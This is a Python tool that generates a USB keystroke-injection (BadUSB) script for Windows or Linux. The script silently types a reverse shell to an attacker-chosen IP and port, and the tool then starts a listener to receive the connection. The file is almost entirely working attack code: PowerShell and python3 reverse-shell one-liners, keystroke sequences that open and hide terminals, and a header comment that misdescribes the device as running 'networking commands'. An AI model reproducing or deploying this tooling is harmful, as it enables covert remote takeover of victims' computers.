import PySimpleGUI as sg
import socket, sys, time
import platform
import os

def generator():
    sg.theme('Dark Blue 3') 

    layout = [[sg.Text('Where save the payload?')],
            [sg.Text('path ', size=(15, 1)), sg.InputText(), sg.FileBrowse()],
            [sg.Submit(), sg.Cancel()]]
    layout2 = [[sg.Text('Port to listen to:'),sg.InputText()],
            [sg.Text('Listener IP:'),sg.InputText()],
            [sg.Text('Target System:'),sg.Radio('windows',"R",default=True),sg.Radio("Linux","R")],
            [sg.Submit(), sg.Cancel()]]
    window = sg.Window('reverse shell generator', layout)

    event, values = window.read()
    window.close()
    file_path = values[0]      # get the data from the values dictionary
    print(file_path)
    window = sg.Window('reverse shell generator', layout2)

    event, values = window.read()
    window.close()
    print(values)
    ip=values[1]
    port=values[0]
    localOs=0
    if values[2]:  #if windows
        payload= f"$LHOST = \\\"{ip}\\\"; $LPORT = {port};"+" $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\\\"$Output`n\\\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"  
    if values[3]:  #if linux
        payload=f"export RHOST=\\\"{ip}\\\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\\\"RHOST\\\"),int(os.getenv(\\\"RPORT\\\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"sh\\\")'&"
        localOs=1
    print(payload)
    return [ip,port,payload,localOs,file_path]

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

values=generator()
ip=values[0]
port=values[1]
payload=values[2]
localOs=values[3]
file=values[4]
if localOs == 0:
    PayloadFile=f"""# Basic Program to run some networking commands
# Code also display some text on TFT screen
# This code works for Windows based PC/Laptop but can be modified for Other OS
import time
import os
import usb_hid
import digitalio
import board
import busio
from adafruit_hid.keyboard import Keyboard, Keycode
from keyboard_layout_win_uk import KeyboardLayout




try:
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayout(keyboard)
    time.sleep(1)
    keyboard.send(Keycode.WINDOWS, Keycode.LEFT_CONTROL,Keycode.RIGHT_ARROW)
    time.sleep(0.5)
    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.3)
    
  
    
    #open cmd
    keyboard_layout.write('powershell')
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)
    keyboard.send(Keycode.F11)
    time.sleep(1.2)
    
    #commands are OS specific make sure to provide correct commands
    
    keyboard_layout.write("{payload}") 
    keyboard.send(Keycode.ENTER)
    time.sleep(1)
    keyboard.send(Keycode.WINDOWS, Keycode.LEFT_CONTROL,Keycode.LEFT_ARROW)
    keyboard.release_all()
    
except Exception as ex:
    keyboard.release_all()
    raise ex


"""
elif localOs == 1:
    PayloadFile=f"""# Basic Program to run some networking commands
# Code also display some text on TFT screen
# This code works for Linux based PC/Laptop but can be modified for Other OS
import time
import os
import usb_hid
import digitalio
import board
import busio
from adafruit_hid.keyboard import Keyboard, Keycode
from keyboard_layout_win_uk import KeyboardLayout




try:
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayout(keyboard)
    time.sleep(1)
    keyboard.send(Keycode.LEFT_CONTROL, Keycode.ALT, Keycode.T)
    time.sleep(0.3)
    
    

    
    #commands are OS specific make sure to provide correct commands
    keyboard_layout.write("{payload}") 
    keyboard.send(Keycode.ENTER)
    time.sleep(1)
    
    keyboard_layout.write("disown &1") 
    keyboard.send(Keycode.ENTER)
    keyboard_layout.write("exit") 
    keyboard.send(Keycode.ENTER)
    time.sleep(1)
    keyboard.release_all()
    
except Exception as ex:
    keyboard.release_all()
    raise ex


"""
if file:
    with open(file,"w") as f:
        f.write(PayloadFile)




if platform.system() == "Windows":
    os.system("cmd /c ncat -lvnp " + port)

else:
    listen(ip,int(port))